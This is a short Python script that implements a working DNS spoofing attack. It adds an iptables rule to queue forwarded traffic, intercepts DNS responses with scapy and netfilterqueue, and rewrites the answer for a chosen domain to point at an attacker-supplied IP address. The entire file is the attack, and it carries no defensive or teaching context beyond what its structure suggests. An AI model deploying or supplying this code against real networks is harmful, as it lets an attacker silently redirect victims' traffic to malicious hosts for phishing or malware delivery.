#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess

class DNSSpoof:

	def __init__(self, t, r):
		self.target = t
		self.redirect_to = r
		subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

	def process_packet(self, packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = scapy_packet[scapy.DNSQR].qname
			if self.target in str(qname):
				print("[+] Spoofing target")
				answer = scapy.DNSRR(rrname=qname, rdata= self.redirect_to)
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1



			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum


			packet.set_payload(bytes(scapy_packet))

		packet.accept()

	def start(self):
		queue = netfilterqueue.NetfilterQueue()
		queue.bind(0, self.process_packet)
		queue.run()